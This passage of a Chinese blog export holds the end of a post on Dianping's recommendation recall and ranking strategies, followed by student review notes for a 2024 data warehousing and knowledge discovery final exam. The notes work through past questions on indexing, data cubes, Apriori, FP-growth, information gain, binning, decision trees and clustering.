<h4 id="召回"><a href="#召回" class="headerlink" title="召回"></a>召回</h4><p>大众点评通过用户行为、场景等进行实时判断，通过多个召回策略召回不同候选集。再对召回的候选集进行融合。以下是大众点评所应用到的几种召回策略：</p>
<p><strong>User-Based</strong> **协同过滤：**找出与当前User X最相似的N个User，并根据N个User对某Item的打分估计X对该Item的打分。在相似度算法方面，大众点评采用了Jaccard Similarity：</p>
<p><strong>Model-Based</strong> *<em>协同过滤：*<em>用一组隐含因子来联系用户和商品。其中每个用户、每个商品都用一个向量来表示，用户</em>u*对商品</em>i*的评价通过计算这两个向量的内积得到。算法的关键在于根据已知的用户对商品的行为数据来估计用户和商品的隐因子向量。</p>
<p>**Item-Based协同过滤：*<em>大众点评先用word2vec对每个Item取其隐含空间的向量，然后用Cosine Similarity计算用户</em>u*用过的每一个Item与未用过Item <em>i</em>之间的相似性。最后对Top N的结果进行召回。</p>
<p>**Query-Based：**是根据Query中包含的实时信息（如地理位置信息、WiFi到店、关键词搜索、导航搜索等）对用户的意图进行抽象，从而触发的策略。</p>
<p>**Location-Based：**移动设备的位置是经常发生变化的，不同的地理位置反映了不同的用户场景，可以在具体的业务中充分利用。在推荐的候选集召回中，大众点评会根据用户的实时地理位置、工作地、居住地等地理位置触发相应的策略。</p>
<h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><p>每类召回策略都会召回一定的结果，这些结果去重后需要统一做排序。大众点评推荐排序的框架大致可以分为三块：</p>
<p>**离线计算层：**离线计算层主要包含了算法集合、算法引擎，负责数据的整合、特征的提取、模型的训练、以及线下的评估。</p>
<p>**近线实时数据流：**主要是对不同的用户流实施订阅、行为预测，并利用各种数据处理工具对原始日志进行清洗，处理成格式化的数据，落地到不同类型的存储系统中，供下游的算法和模型使用。</p>
<p>**在线实时打分：**根据用户所处的场景，提取出相对应的特征，并利用多种机器学习算法，对多策略召回的结果进行融合和打分重排。</p>
<p><img data-src="C:/Users/86188/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" alt="IMG_256"></p>
<p>上图即是大众点评现有的排序框架，到目前为止，大众点评推荐排序系统尝试了多种线性、非线性、混合模型等机器学习方法，如逻辑回归、GBDT、GBDT+LR等。通过线上实验发现，相较于线性模型，传统的非线性模型如GBDT，并不一定能在线上AB测试环节对CTR预估有比较明显的提高。在实际的运用当中，大众点评根据Google在2016年提出的Wide &amp; Deep Learning模型，并结合自身业务的需求与特点，将线性模型组件和深度神经网络进行融合，形成了在一个模型中实现记忆和泛化的宽深度学习框架。</p>
]]></content>
      <categories>
        <category>数据集成</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>数据集成</tag>
      </tags>
  </entry>
  <entry>
    <title>数据仓库与知识发现2024 期末复习</title>
    <url>/2024/12/30/%E6%95%B0%E6%8D%AE%E4%BB%93%E5%BA%93%E4%B8%8E%E7%9F%A5%E8%AF%86%E5%8F%91%E7%8E%B0-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="复习建议"><a href="#复习建议" class="headerlink" title="复习建议"></a>复习建议</h3><ul>
<li><p>开卷考试，建议携带材料：</p>
<ul>
<li>数据仓库白皮书（数据仓库与数据挖掘） +  黑皮书 （数据挖掘：概念与技术），可能会考一些往年没有的题，这个时候翻书就很有用了；</li>
<li>往年卷题型解答（最好是你自己写的过程）；</li>
<li>对数表、分数表、信息熵计算表；</li>
</ul>
</li>
<li><p>题型与往年题相同，数据会变，因此推荐面向往年题复习。</p>
<ul>
<li>一道数据仓库 + 一道关联 + 一道数据预处理与分类 + 一道聚类；</li>
<li><strong>复习时建议动笔计算，只有动手了才更好理解如何计算；</strong></li>
<li>一定要使用题目要求的算法；</li>
</ul>
</li>
</ul>
<span id="more"></span>

<h3 id="数据仓库及其实现技术"><a href="#数据仓库及其实现技术" class="headerlink" title="数据仓库及其实现技术"></a>数据仓库及其实现技术</h3><h4 id="题型1-数据仓库的作用和地位"><a href="#题型1-数据仓库的作用和地位" class="headerlink" title="题型1 数据仓库的作用和地位"></a>题型1 数据仓库的作用和地位</h4><p><strong>问：简述数据仓库在知识发现过程中的作用和地位。（2012、2013）</strong></p>
<p>答：</p>
<p>作用：数据仓库是一个面向主题的（subject-oriented）、集成的（integrated）、时变的（time-variant）、非易失的（nonvolatile）数据集合，通常用于辅助决策支持。数据仓库通过数据清理、数据变化、继承和定期刷新等办法，从一个或多个数据源收集数据，存放在一个一致的模式下。数据仓库能够提供大量的、按照实际要求集成的不同主题的数据，通过OLAP引擎对其进行数据挖掘，发现知识。</p>
<p>地位：数据仓库是知识发现过程中不可或缺的一环，它是进行数据挖掘的必要基础。数据仓库能提供非冗余的有效数据，这些数据都是面向主题的，因此能够大大提高知识发现的能力和效率。没有数据仓库，知识发现就没有数据源。</p>
<h4 id="题型2-B树"><a href="#题型2-B树" class="headerlink" title="题型2 B树"></a>题型2 B树</h4><p><strong>问：为何B树等在数据库中广泛使用的索引技术无法被直接引入数据仓库？（2012、2013）</strong></p>
<p>答：</p>
<ol>
<li>B树要求属性必须具有许多不同的值，比如iteamID、customID等；</li>
<li>B树要求查询应具有更简单的条件和更少的结果；</li>
<li>创建B树的空间和时间复杂度很大；</li>
</ol>
<h4 id="题型3-BITMAP索引"><a href="#题型3-BITMAP索引" class="headerlink" title="题型3 BITMAP索引"></a>题型3 BITMAP索引</h4><p><strong>问：试采用BITMAP索引方式对图中的维度表进行索引。（2012、2013、2014、2015）</strong></p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241229151929947.png" alt="image-20241229151929947" style="zoom: 67%;" />

<p>答：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241229153041093.png" alt="image-20241229153041093"></p>
<h4 id="题型4-Join-Index索引"><a href="#题型4-Join-Index索引" class="headerlink" title="题型4 Join Index索引"></a>题型4 Join Index索引</h4><p><strong>问：试采用 Join Index 对图中的事实表和维表进行索引。（2014、2015）</strong></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102095053143.png" alt="image-20250102095053143"></p>
<p>答：</p>
<p>将维表连线到事实表即可，如下：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241229155211279.png" alt="image-20241229155211279"></p>
<h4 id="题型5-数据立方体"><a href="#题型5-数据立方体" class="headerlink" title="题型5 数据立方体"></a>题型5 数据立方体</h4><p><strong>问：数据立方体是什么？什么是数据立方体的多层和多维度？（2019）</strong></p>
<p>答：</p>
<p><strong>数据立方体是什么？</strong></p>
<p>数据立方体（Data Cube）是一种用于表示和处理多维数据的数据结构。在数据库和数据仓库系统中，它是一个常用的概念，特别是在在线分析处理（OLAP）和多维数据分析中。数据立方体使得用户可以从多个维度（如时间、地区、产品类型等）分析数据，支持复杂的数据查询和汇总操作。<br>以下是数据立方体的几个关键特点：</p>
<ol>
<li><strong>多维视图</strong>：数据立方体提供多维的视图，使用户能够从不同的角度和维度分析数据。</li>
<li><strong>聚合操作</strong>：它支持聚合操作，如求和、平均、最大值和最小值等，以便对数据进行汇总分析。</li>
<li><strong>切片和切块操作</strong>：用户可以进行切片（Slice）和切块（Dice）操作，以便查看数据的特定部分。切片是指在某个维度上进行数据的筛选，而切块是指在多个维度上同时进行筛选。</li>
<li><strong>数据钻取</strong>：数据立方体允许用户在不同层级上钻取数据，比如从年度数据钻取到季度或月度数据。</li>
<li><strong>灵活性和可扩展性</strong>：数据立方体设计灵活，可以根据需要进行扩展，以包含更多维度或数据。</li>
</ol>
<p>在实际应用中，数据立方体能够帮助企业和组织快速获取关键的业务洞察，支持决策制定过程。通过数据立方体，用户可以轻松地执行复杂的数据查询，无需进行复杂的数据库编程。</p>
<p>数据立方体是一种多维数据模型，主要有星形模式、雪花模式和事实星座模式。</p>
<ul>
<li>星形模式 它是最常见的模式，它包括一个大的中心表（事实表），包含了大批数据但是不冗余；一组小的附属表（维表），每维一个。如下所示，从item、time、branch、location四个维度去观察数据，中心表是Sales Fact Table，包含了四个维表的标识符（由系统产生）和三个度量。每一维使用一个表表示，表中的属性可能会形成一个层次或格。</li>
</ul>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/v2-c14628116cf9d7fdb56c36163b730ea5_1440w.jpg" alt="img" style="zoom:50%;" />

<p>雪花模式它是星模式的变种，将其中某些表规范化，把数据进一步的分解到附加的表中，形状类似雪花。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/v2-67d2ca6cb07153c985a7f5e99afd774b_1440w.jpg" alt="img" style="zoom:50%;" />

<p>事实星座</p>
<p>允许多个事实表共享维表，可以看作是星形模式的汇集。如下所示，Sales和Shipping两个事实表共享了time、item、location三个维表。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/v2-f706bce800a8b6b6335cf6712bd354f8_1440w.jpg" alt="img" style="zoom:50%;" />

<p>在数据仓库中多用事实星座模式，因为它能对多个相关的主题建模；而在数据集市流行用星形或雪花模式。</p>
<p><strong>什么是数据立方体的多层和多维度？</strong></p>
<p>数据立方体的“多层”和“多维度”是两个关键的概念，它们在多维数据分析中起着重要的作用：<br><strong>多维度（Multidimensionality）</strong></p>
<ul>
<li><strong>定义</strong>：在数据立方体中，多维度是指数据可以沿着多个不同的维度进行组织和分析。每个维度代表数据的一个特定方面或分类。</li>
<li><strong>例子</strong>：常见的维度包括时间（例如年、月、日）、地理位置（如国家、城市）、产品类别等。例如，一个零售业务的数据立方体可能包含时间、产品类别和地区三个维度。</li>
<li><strong>作用</strong>：多维度使得用户能够从不同角度查看和分析数据，以便更全面地理解业务情况和趋势。</li>
</ul>
<p><strong>多层（Multilevel）</strong></p>
<ul>
<li><strong>定义</strong>：在数据立方体中，多层指的是每个维度内部的层次结构。一个维度可以被分解成不同的层次，每个层次提供不同粒度的数据视图。</li>
<li><strong>例子</strong>：以时间维度为例，时间可以被分解为年、季、月、日等层次。用户可以选择查看年度总结数据，也可以深入到月度或日度数据进行更详细的分析。</li>
<li><strong>作用</strong>：多层结构允许用户在不同的粒度级别上进行数据分析，从而进行更深入的数据挖掘和洞察。</li>
</ul>
<p>在实际应用中，数据立方体的多维度和多层特性使其成为一个强大的工具，用于支持复杂的数据分析和决策制定过程。用户可以通过在不同维度和层次上进行分析，获得更深入、更全面的业务洞察。</p>
<h4 id="题型6-表合并、表冗余、表分割"><a href="#题型6-表合并、表冗余、表分割" class="headerlink" title="题型6 表合并、表冗余、表分割"></a>题型6 表合并、表冗余、表分割</h4><p><strong>问：数据仓库数据存储据设计中，表合并、表冗余、表分割三者的原理。（2019）</strong></p>
<p>在数据仓库存储设计中，表合并、表冗余和表分割是三个关键的概念，它们各自基于不同的原理，旨在优化数据存储、查询性能和数据整合。下面我将详细解释每一个概念：<br><strong>表合并（Table Merging）</strong></p>
<ul>
<li>原理：表合并是将多个相关的表合并为一个更大的表的过程。这通常发生在维度表与事实表之间，或者是当多个维度表具有高度相关性时。例如，在一个销售数据仓库中，可以将产品信息、供应商信息和价格信息合并为一个大表。</li>
<li>目的：主要目的是为了简化查询，通过减少需要进行连接操作的表的数量来提高查询效率。这对于需要频繁访问多个表的数据分析尤为重要。</li>
<li>优点：减少了查询时的表连接操作，简化了查询逻辑，提高了查询效率。</li>
<li>缺点：可能导致数据冗余和存储空间的增加。</li>
</ul>
<p><strong>表冗余（Table Redundancy）</strong></p>
<ul>
<li>原理：表冗余是指在一个或多个表中故意存储重复数据的做法。在数据仓库中，这通常意味着某些数据在多个地方被复制和存储。</li>
<li>目的：主要是为了优化查询性能，尤其是在分布式系统中，通过本地化数据来减少查询时的网络延迟。</li>
<li>优点：提高了数据检索的速度，减少了复杂的表连接和数据聚合操作。</li>
<li>缺点：增加了存储需求，可能导致数据一致性维护的复杂性增加。</li>
</ul>
<p><strong>表分割（Table Partitioning）</strong></p>
<ul>
<li>原理：表分割是将一个大表分割成多个更小的、管理起来更容易的部分。这可以是水平分割（根据行），也可以是垂直分割（根据列）。</li>
<li>目的：旨在提高大数据集的管理效率和查询性能。分割后，查询可以仅针对相关的数据分区进行，而不是整个表。</li>
<li>优点：提高了大型表的管理效率，优化了查询性能，降低了维护成本。</li>
<li>缺点：如果分割策略设计不当，可能会导致数据分布不均匀，影响查询性能。</li>
</ul>
<p>综上所述，这三种策略在数据仓库设计中都扮演着重要角色。选择哪种策略取决于特定的数据特征、查询需求和系统架构。正确地应用这些策略可以显著提高数据仓库的性能和效率。</p>
<h3 id="关联"><a href="#关联" class="headerlink" title="关联"></a>关联</h3><h4 id="题型1-Apriori算法求频繁集"><a href="#题型1-Apriori算法求频繁集" class="headerlink" title="题型1 Apriori算法求频繁集"></a>题型1 Apriori算法求频繁集</h4><p><strong>问：针对图中的交易事务数据，采用Apriori算法求取频率项集，假设最小支持度为&gt;&#x3D;30%。（2012）</strong></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241229161243268.png" alt="image-20241229161243268"></p>
<p>答：</p>
<blockquote>
<p>支持度计算公式：support(X) &#x3D; count(X∈T)  &#x2F; |D|</p>
</blockquote>
<p>Apriori算法求解过程如下：</p>
<p>首先产生 1-候选集C1，然后在C1上去除支持度小于sup_min的项集，形成 1-频繁集L1：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241230124904038.png" alt="image-20241230124904038"></p>
<p>然后将L1中的各项集组合连接，产生 2-候选集C2，并且再次在C2上筛除支持度小于sup_min的项集，形成 2-频繁集L2：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241230125857356.png" alt="image-20241230125857356"></p>
<p>然后将L2中的各项集组合连接，注意：<strong>只有最后一个项目不同的两个项集才可以进行连接</strong>，例如{a,b}和{a,d}可以连接，但{a,b}和{b,c}不可以连接；<strong>并且还要判断产生的项集的子集是否都在L2中，即频繁集的子集必须是频繁集</strong>，例如{b,c}和{b,e}连接成{b,c,e}后，由于{c,e}不在L2中，因此要筛除。</p>
<p>连接后产生 3-候选集C3，并且再次在C3上筛除支持度小于sup_min的项集，形成 3-频繁集L3：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241230132126486.png" alt="image-20241230132126486"></p>
<p>然后重复上述步骤，继续将L3的各项集组合连接，发现C4为空。</p>
<h4 id="题型2-FP增长算法求频繁集"><a href="#题型2-FP增长算法求频繁集" class="headerlink" title="题型2 FP增长算法求频繁集"></a>题型2 FP增长算法求频繁集</h4><p><strong>问：针对图中（见题型1）的交易事务数据，采用FP增长算法求取频率项集，假设最小支持度为&gt;&#x3D;30%。（2013、2014、2015）</strong></p>
<p><strong>答：</strong></p>
<p>FP增长算法求解过程如下：</p>
<p>首先扫描交易记录集D，计算每个项目的计数值，选出支持度计数大于3的项，<strong>降序排列</strong>，放在列表L中：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241230135417471.png" alt="image-20241230135417471"></p>
<p>然后将交易记录集D中的项目按照L中的顺序表示，如下：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241230135800049.png" alt="image-20241230135800049"></p>
<p>开始构建FP树，先创建一个标记为null的根节点，然后依次扫描交易记录集D的每个交易，建立对应的路径（如果路径不存在），并将路径上各节点的计数+1（一个更简便的方法是，先将树画出来，然后检查每个节点所对应的路径在D中出现了几次）。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/e5653bbbf8d43248cc17e66dcbcb448a.png" alt="e5653bbbf8d43248cc17e66dcbcb448a"></p>
<p>然后对 列表L <strong>从下往上</strong>遍历项目：</p>
<p>对于项目C：有{dbec:1}、{dbc:1}、{deac:1}、{dc:1}、{bac:1}五条路径，搜索这些路径，可以得到包含项目C的<strong>频繁集</strong>为：{c} 5、{dc} 4、{bc} 3；</p>
<p>对于项目A：有{dbea:2}、{dea:2}、{ba:1}三条路径，可以得到包含项目A的频繁集为：{a} 5 、{da} 4、{ea} 4、{ba} 3、{dea} 4；</p>
<p>对于项目E，有{dbe:4}、{de:2}两条路径，可以得到包含项目E的频繁集为：{e} 6、{de} 6、{be} 4、{bde} 4；</p>
<p>对于项目B，有{db:6}、{b:1}两条路径，可以得到包含项目B的频繁集为：{b} 7、{db} 6;</p>
<p>对于项目D，有{d:9}一条路径，可以得到包含项目D的频繁集为{d} 9。</p>
<h4 id="题型3-构造关联规则"><a href="#题型3-构造关联规则" class="headerlink" title="题型3 构造关联规则"></a>题型3 构造关联规则</h4><p><strong>问：基于上述频繁项集（见题型1 2），构造关联规则，要求最小置信度&gt;&#x3D;50%。(2012、2013、2014、2015）</strong></p>
<blockquote>
<p> 关联规则置信度计算公式：confidence(X&#x3D;&gt;Y)  &#x3D;  support(X∪Y)  &#x2F; support(X)</p>
</blockquote>
<p>答：</p>
<p>我们可以从频繁项集中产生关联规则，并且这些规则都会自动地满足最小支持度。</p>
<p>由频繁集{a,d,e}得到关联规则：</p>
<p>​	{a,d}&#x3D;&gt;{e}, confidence &#x3D; support(a,d,e) &#x2F; support(a,d)   &#x3D; 4&#x2F;4 &#x3D; 1</p>
<p>​	{a,e}&#x3D;&gt;{d}, confidence &#x3D; 4&#x2F;4 &#x3D; 1</p>
<p>​	{d,e}&#x3D;&gt;{a}, confidence &#x3D; 4&#x2F;6 ≈ 0.67</p>
<p>​	{a}&#x3D;&gt;{d,e}, confidence &#x3D; 4&#x2F;5 &#x3D; 0.8</p>
<p>​	{d}&#x3D;&gt;{a,e}, confidence &#x3D; 4&#x2F;9 ≈ 0.44  舍弃</p>
<p>​	{e}&#x3D;&gt;{a,d}, confidence &#x3D; 4&#x2F;6 ≈ 0.67</p>
<p>由频繁集{b,d,e}得到关联规则：</p>
<p>​	{b,d}&#x3D;&gt;{e}, confidence &#x3D; 4&#x2F;6 ≈ 0.67</p>
<p>​	{b,e}&#x3D;&gt;{d}, confidence &#x3D; 4&#x2F;4 &#x3D; 1</p>
<p>​	{d,e}&#x3D;&gt;{b}, confidence &#x3D; 4&#x2F;6 ≈ 0.67</p>
<p>​	{b}&#x3D;&gt;{d,e}, confidence &#x3D; 4&#x2F;7 ≈ 0.57</p>
<p>​	{d}&#x3D;&gt;{b,e}, confidence &#x3D; 4&#x2F;9 ≈ 0.44  舍弃</p>
<p>​	{e}&#x3D;&gt;{b,d}, confidence &#x3D; 4&#x2F;6 ≈ 0.67</p>
<p>由频繁集{a,b}得到关联规则：</p>
<p>​	{a}&#x3D;&gt;{b}, confidence &#x3D; 3&#x2F;5 &#x3D; 0.6</p>
<p>​	{b}&#x3D;&gt;{a}, confidence &#x3D; 3&#x2F;7  舍弃</p>
<p>由频繁集{a,d}得到关联规则：</p>
<p>​	{a}&#x3D;&gt;{d}, confidence &#x3D; 4&#x2F;5 &#x3D; 0.8</p>
<p>​	{d}&#x3D;&gt;{a}, confidence &#x3D; 4&#x2F;9  舍弃</p>
<p>由频繁集{a,e}得到关联规则：</p>
<p>​	{a}&#x3D;&gt;{e}, confidence &#x3D; 4&#x2F;5 &#x3D; 0.8</p>
<p>​	{e}&#x3D;&gt;{a}, confidence &#x3D; 4&#x2F;6 ≈ 0.67</p>
<p>由频繁集{b,c}得到关联规则：</p>
<p>​	{b}&#x3D;&gt;{c}, confidence &#x3D; 3&#x2F;7  舍弃</p>
<p>​	{c}&#x3D;&gt;{b}, confidence &#x3D; 3&#x2F;5 &#x3D; 0.6</p>
<p>由频繁集{b,d}得到关联规则：</p>
<p>​	{b}&#x3D;&gt;{d}, confidence &#x3D; 6&#x2F;7</p>
<p>​	{d}&#x3D;&gt;{b}, confidence &#x3D; 6&#x2F;9</p>
<p>由频繁集{b,e}得到关联规则：</p>
<p>​	{b}&#x3D;&gt;{e}, confidence &#x3D; 4&#x2F;7</p>
<p>​	{e}&#x3D;&gt;{b}, confidence &#x3D; 4&#x2F;6</p>
<p>由频繁集{c,d}得到关联规则：</p>
<p>​	{c}&#x3D;&gt;{d}, confidence &#x3D; 4&#x2F;5</p>
<p>​	{d}&#x3D;&gt;{c}, confidence &#x3D; 4&#x2F;9  舍弃</p>
<p>由频繁集{d,e}得到关联规则：</p>
<p>​	{d}&#x3D;&gt;{e}, confidence &#x3D; 6&#x2F;9</p>
<p>​	{e}&#x3D;&gt;{d}, confidence &#x3D; 6&#x2F;6</p>
<p>最后得到的关联规则有：</p>
<p>​	{a,d}&#x3D;&gt;{e}、{a,e}&#x3D;&gt;{d}、{d,e}&#x3D;&gt;{a}、{a}&#x3D;&gt;{d,e}、{e}&#x3D;&gt;{b,d}、{b,d}&#x3D;&gt;{e}、{b,e}&#x3D;&gt;{d}、{d,e}&#x3D;&gt;{b}、{b}&#x3D;&gt;{d,e}、{e}&#x3D;&gt;{b,d}、{a}&#x3D;&gt;{b}、{a}&#x3D;&gt;{d}、{a}&#x3D;&gt;{e}、{e}&#x3D;&gt;{a}、{c}&#x3D;&gt;{b}、{b}&#x3D;&gt;{d}、{d}&#x3D;&gt;{b}、{b}&#x3D;&gt;{e}、{e}&#x3D;&gt;{b}、{c}&#x3D;&gt;{d}、{d}&#x3D;&gt;{c}、{d}&#x3D;&gt;{e}、{e}&#x3D;&gt;{d}。</p>
<h3 id="数据预处理与分类"><a href="#数据预处理与分类" class="headerlink" title="数据预处理与分类"></a>数据预处理与分类</h3><h4 id="题型1-信息增益进行属性筛选"><a href="#题型1-信息增益进行属性筛选" class="headerlink" title="题型1 信息增益进行属性筛选"></a>题型1 信息增益进行属性筛选</h4><p><strong>问：给定图中的目标集（DOG）和对比集（CAT），使用信息增益计算各个属性与当前概念描述任务之间的相关性。并采用T&#x3D;0.1作为阈值，对属性进行筛选。（2014、2015）</strong></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241230150240180.png" alt="image-20241230150240180"></p>
<blockquote>
<p>首先推荐阅读文章<a href="https://blog.csdn.net/u013172930/article/details/142676655">什么是信息增益-CSDN博客</a>，理解信息熵、信息增益等知识。</p>
<p>省流：</p>
<p>信息熵 &#x3D; -ΣPi*log2(Pi)，表示信息的不确定性，特点：</p>
<ul>
<li>当所有事件的概率相等时，熵最大，即最不确定。</li>
<li>当一个事件的概率为 1，其他事件的概率为 0 时，熵为 0，即完全确定。</li>
</ul>
<p>信息增益（Information Gain）表示由于引入某一特征或条件而使得系统的不确定性减少的程度，它是信息熵的减少量。</p>
</blockquote>
<p>答：</p>
<p>注：在计算时建议对照信息熵计算表辅助计算。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102102552171.png" alt="image-20250102102552171" style="zoom:50%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102102634347.png" alt="image-20250102102634347" style="zoom:50%;" />

<h4 id="题型2-等宽分桶、等深分桶、3-4-5分桶"><a href="#题型2-等宽分桶、等深分桶、3-4-5分桶" class="headerlink" title="题型2 等宽分桶、等深分桶、3-4-5分桶"></a>题型2 等宽分桶、等深分桶、3-4-5分桶</h4><p><strong>问：针对图中的训练数据集进行离散化处理。要求采用等宽分桶的方式将age和incoming属性离散到3个区间。（2012、2013、2014、2015等宽分桶，2017、2018等深分桶，2020 3-4-5分桶）</strong>	</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241230165021639.png" alt="image-20241230165021639"></p>
<p><strong>等宽分桶（Equal-width binning）</strong>：</p>
<ul>
<li><p>在等宽分桶中，数据的范围被分割成宽度相等的区间。</p>
</li>
<li><p>每个区间的宽度由数据的最大值和最小值决定。</p>
</li>
<li><p>这种方法的优点是实现简单，但缺点是可能不会很好地处理数据中的异常值或非均匀分布。</p>
</li>
<li><p>假设我们有一组年龄数据：20,22,25,30,32,35,38,40,45,50。</p>
<ul>
<li>我们想要将这些数据分成4个等宽的区间。</li>
<li>数据的范围是20到50，因此每个区间的宽度为 (50−20)&#x2F;4&#x3D;7.5(50−20)&#x2F;4&#x3D;7.5。</li>
<li>因此，分桶后的区间为：20−27.5, 27.5−35, 35−42.5, 42.5−50。</li>
</ul>
</li>
</ul>
<p><strong>等深分桶（Equal-frequency binning）</strong>：</p>
<ul>
<li><p>等深分桶将数据分割成包含大致相同数量数据点的区间。</p>
</li>
<li><p>这意味着每个桶的宽度可能会不同，但每个桶中的数据点数量相似。</p>
</li>
<li><p>这种方法对于处理有偏分布的数据较为有效，但可能会导致区间的界限不够明确。</p>
</li>
<li><p>使用同样的数据：20,22,25,30,32,35,38,40,45,50。</p>
<ul>
<li>假设我们想要分成3个包含大致相同数量的数据点的区间。</li>
<li>每个区间将包含大约3或4个数据点。</li>
<li>因此，分桶后的区间可能是：20,22,25,30,  32,35,38,  40,45,50。</li>
</ul>
</li>
</ul>
<p><strong>3-4-5原则分桶</strong>：</p>
<ul>
<li><p>这是一种更加定性的分桶方法，通常用于商业和市场分析。</p>
</li>
<li><p>它基于这样一个观察：人类倾向于更好地记住和理解3到5个类别。</p>
</li>
<li><p>在应用这个原则时，数据被分割成3到5个区间，以使结果更容易被人理解和记忆。</p>
</li>
<li><p>这种方法更多地依赖于业务理解和目标，而不是严格的数学规则。</p>
</li>
<li><p>假设我们有一家公司的销售额数据，我们需要将这些数据分为容易理解的几个区间。</p>
<ul>
<li><p>数据范围很广，从几千到几百万不等。</p>
</li>
<li><p>应用3-4-5原则，我们可能会选择分成4个区间：小型销售（数千至数万），中型销售（数万至十万），大型销售（十万至百万），超大型销售（超过百万）。</p>
</li>
</ul>
</li>
</ul>
<p>答：</p>
<p><strong>等宽分桶 age：</strong></p>
<p>​	d &#x3D; (max - min) &#x2F; N &#x3D; (66 - 21) &#x2F; 3 &#x3D; 15，共3个区间，区间宽度为15。</p>
<p>​	[21, 36) :  1,4,7,8,10,13,14</p>
<p>​	[36, 51) :  2,5,11,12,16</p>
<p>​	[51, 66] :  5,6,9,15</p>
<p><strong>等宽分桶 income:</strong></p>
<p>​	d &#x3D;  (max - min) &#x2F; N &#x3D; (78000 - 12000) &#x2F; 3 &#x3D; 22000， 共3个区间，区间宽度为22000。</p>
<p>​	[12000, 34000) :  3,4,5,10,13</p>
<p>​	[34000, 56000) :  2,7,8,11,15                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 </p>
<p>​	[56000, 78000] :  1,6,9,12,14,16</p>
<h4 id="题型3-构造决策树"><a href="#题型3-构造决策树" class="headerlink" title="题型3 构造决策树"></a>题型3 构造决策树</h4><p><strong>问：依据训练集（见题型2），采用信息增益作为指标构造决策树。（2012）</strong></p>
<blockquote>
<p> 构造决策树的过程大概是：</p>
<ul>
<li><p>计算所有属性（<strong>age</strong>、<strong>income</strong>、<strong>student</strong>）的信息增益。</p>
</li>
<li><p>选择信息增益最大的属性作为根节点。</p>
</li>
<li><p>针对根节点的每个分支递归进行划分，直到无法继续分裂（比如信息增益小于某阈值或样本全属于一个类别）。</p>
</li>
<li><p>用分类结果填充叶节点。</p>
</li>
</ul>
</blockquote>
<p>答：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/resul2331siiq899t.png" alt="resul2331siiq899t"></p>
<p>注：这道题数据出的不好，导致在income&gt;56000段划分不出来，老师给出的说法是随机选一个，我就都选了&gt;2000。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/fe1bad26580124f66288cc104d8169f.png" alt="fe1bad26580124f66288cc104d8169f" style="zoom:33%;" />

<p><strong>问：采用构造出的决策树，分类未知元组（24，75000，yes）。</strong></p>
<p>答：</p>
<p>按照上面得到的决策树，（24，75000，yes）分类为 &gt; 2000。</p>
<h4 id="题型4-朴素贝叶斯方法"><a href="#题型4-朴素贝叶斯方法" class="headerlink" title="题型4 朴素贝叶斯方法"></a>题型4 朴素贝叶斯方法</h4><p><strong>问： 依据训练集（见题型2），采用朴素贝叶斯方法分类未知元组（24，75000，yes），对分类属性Classs:buys_MP进行预测。（2013、2014、2015）</strong></p>
<p>答：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/64a36f3e-b3a1-46f4-8d12-a46fe8bd37fc.png" alt="64a36f3e-b3a1-46f4-8d12-a46fe8bd37fc" style="zoom:50%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/dec448b0-49fd-4f8f-96ea-47a90d212569.png" alt="dec448b0-49fd-4f8f-96ea-47a90d212569" style="zoom:50%;" />

<h3 id="聚类"><a href="#聚类" class="headerlink" title="聚类"></a>聚类</h3><h4 id="题型1-曼哈顿距离、相异矩阵"><a href="#题型1-曼哈顿距离、相异矩阵" class="headerlink" title="题型1 曼哈顿距离、相异矩阵"></a>题型1 曼哈顿距离、相异矩阵</h4><p><strong>问： 针对图中的数据，采用曼哈顿距离作为距离函数，给出对应的相异矩阵。（2012、2013、2014、2015）</strong></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241231132058491.png" alt="image-20241231132058491"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241231133503356.png" alt="image-20241231133503356"></p>
<p>答：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241231134542983.png" alt="image-20241231134542983" style="zoom:67%;" />

